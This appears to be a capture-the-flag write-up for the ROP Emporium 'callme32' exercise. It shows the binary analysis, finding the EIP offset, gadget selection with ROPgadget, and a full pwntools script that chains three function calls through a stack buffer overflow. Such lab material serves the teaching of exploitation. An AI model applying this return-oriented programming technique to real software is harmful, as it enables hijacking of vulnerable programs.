First of all, use checksec to get some binary information
```shell
[marco@marco-pc callme32]$ file callme32 
callme32: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=ceeb3a388347fd09bb234f44846f1480ac7abf64, not stripped
[marco@marco-pc callme32]$ checksec --file='callme32'
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          RW-RPATH   No RUNPATH   82 Symbols     No	0		3	callme32
```

ROP Emporium tell us:
*You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag.*

Before searching functions address, we find out how many bytes are to be filled before EIP
```gdb
gdb-pwndbg callme32

...

pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
pwndbg> r
Starting program: /home/marco/Downloads/callme32/callme32 
callme by ROP Emporium
32bits

Hope you read the instructions...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.

...

EIP  0x6161616c ('laaa')

...

pwndbg> cyclic -l 'laaa'
44
```

As we have seen with `checksec`, the program is not stripped and there isn't PIE (no randomization). This means that we can look up the address of the 3 functions in the binary.

```gdb
pwndbg> i functions
All defined functions:

Non-debugging symbols:
0x08048558  _init
0x08048590  printf@plt
0x080485a0  fgets@plt
0x080485b0  callme_three@plt
0x080485c0  callme_one@plt
0x080485d0  puts@plt
0x080485e0  exit@plt
0x080485f0  __libc_start_main@plt
0x08048600  setvbuf@plt
0x08048610  memset@plt
0x08048620  callme_two@plt
0x08048630  __gmon_start__@plt
0x08048640  _start
0x08048670  __x86.get_pc_thunk.bx
0x08048680  deregister_tm_clones
0x080486b0  register_tm_clones
0x080486f0  __do_global_dtors_aux
0x08048710  frame_dummy
0x0804873b  main
0x080487b6  pwnme
0x0804880c  usefulFunction
0x08048850  __libc_csu_init
0x080488b0  __libc_csu_fini
0x080488b4  _fini
```

Last thing we need to build our exploit, is a gadget that pop 3 argmuments from the stack. this is necessary to clean the stack between calls

```shell
[marco@marco-pc callme32]$ ROPgadget --binary="callme32" > gadgets
[marco@marco-pc callme32]$ cat gadgets | grep pop
0x08048574 : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080487ad : add byte ptr [ebx - 0x723603b3], cl ; popal ; cld ; ret
0x080488a5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048576 : add esp, 8 ; pop ebx ; ret
0x080488bf : inc ebx ; pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080488a4 : jecxz 0x8048831 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080488a3 : jne 0x8048891 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048577 : les ecx, ptr [eax] ; pop ebx ; ret 
0x080488a6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x08048572 : mov edx, 0x83000000 ; les ecx, ptr [eax] ; pop ebx ; ret
0x080488a7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080488ab : pop ebp ; ret
0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048579 : pop ebx ; ret
0x080488aa : pop edi ; pop ebp ; ret
0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
0x080488c0 : pop ss ; add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x080487b3 : popal ; cld ; ret
```
gadget at `*0x080488a9*`seems to be perfect!

Final exploit:
```python
from pwn import *

callme_one = 0x080485c0
callme_two = 0x08048620
callme_three = 0x080485b0
pop_3 = 0x080488a9

shellcode = ("A"*44).encode()
shellcode += p32(callme_one)
shellcode += p32(pop_3)
shellcode += p32(0x1)
shellcode += p32(0x2)
shellcode += p32(0x3)

shellcode += p32(callme_two)
shellcode += p32(pop_3)
shellcode += p32(0x1)
shellcode += p32(0x2)
shellcode += p32(0x3)

shellcode += p32(callme_three)
shellcode += p32(pop_3)
shellcode += p32(0x1)
shellcode += p32(0x2)
shellcode += p32(0x3)

p = process('./callme32')
p.recvuntil('>')
p.sendline(shellcode)
print(p.recvall().decode())
```
